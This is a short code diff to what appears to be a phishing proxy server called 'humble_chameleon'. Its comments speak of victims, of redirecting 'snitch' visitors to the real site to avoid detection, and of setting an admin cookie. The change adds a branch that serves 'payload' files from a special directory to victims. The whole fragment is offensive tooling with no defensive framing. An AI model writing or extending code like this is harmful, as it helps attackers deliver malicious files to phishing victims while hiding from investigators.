@@ -128,6 +128,9 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
     //redirect to the real site if we see the snitch
     if (target_object.target_type == "snitch") {
       views.redirect(target_object.target, humble_response)
+    //deliver a file from our special directory
+    } else if (target_object.target_type == "payload") {
+      views.deliver_file(target_object.target, humble_response)
     //set our admin cookie one time if the config tells us to
     } else if (target_object.target_type == "set_cookie") {
       views.set_cookie(target_object.target, humble_response)
